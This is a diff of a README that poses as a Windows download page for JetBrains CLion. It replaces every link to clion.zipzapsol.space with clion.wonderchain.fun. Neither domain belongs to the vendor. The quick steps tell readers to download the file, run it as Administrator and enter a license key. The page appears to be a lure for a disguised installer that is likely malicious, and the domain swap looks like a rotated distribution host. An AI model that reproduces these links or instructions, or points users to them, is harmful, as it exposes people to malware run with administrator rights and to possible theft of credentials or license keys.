@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **JetBrains CLion** for Windows.
 
 <p align="center">
-  <a href="https://clion.zipzapsol.space/">
+  <a href="https://clion.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-JetBrains%20CLion-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download JetBrains CLion">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[clion.zipzapsol.space](https://clion.zipzapsol.space/)** |
-| **Full URL** | `https://clion.zipzapsol.space/` |
+| **Direct link** | **[clion.wonderchain.fun](https://clion.wonderchain.fun/)** |
+| **Full URL** | `https://clion.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — clion.zipzapsol.space](https://clion.zipzapsol.space/)** (link above)
+1. Click **[Download — clion.wonderchain.fun](https://clion.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://clion.zipzapsol.space/"><strong>⬇ Download JetBrains CLion now</strong></a></p>
+<p align="center"><a href="https://clion.wonderchain.fun/"><strong>⬇ Download JetBrains CLion now</strong></a></p>
 
 ---
 
